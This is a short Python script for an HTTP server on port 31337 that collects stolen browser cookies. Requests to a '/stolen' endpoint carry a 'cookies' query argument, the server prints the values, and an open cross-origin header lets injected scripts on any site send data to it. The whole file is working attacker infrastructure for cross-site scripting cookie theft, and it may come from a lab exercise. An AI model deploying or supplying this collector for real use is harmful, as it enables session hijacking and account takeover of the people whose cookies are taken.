import http.server
from urllib.parse import urlparse, parse_qs
import socketserver
 
class Server(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        parsed_query = parse_qs(parsed_url.query)

        if parsed_url.path != '/stolen':
            result = '[!] Got unknown path: {}'.format(parsed_url.path)
        elif 'cookies' not in parsed_query:
            result = '[!] Could not find the "cookies" query argument'
        else:
            result = '[*] Received these cookies: "{}"'.format(parsed_query['cookies'][0])
        
        print(result)

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(result.encode())
    
    def log_message(self, format, *args):
        # Overwrites the default logger, to avoid cluttering up the console output
        pass
       
port = 31337
server = socketserver.ThreadingTCPServer(('', port), Server)
print("[*] Serving on port {}".format(port))
server.serve_forever()
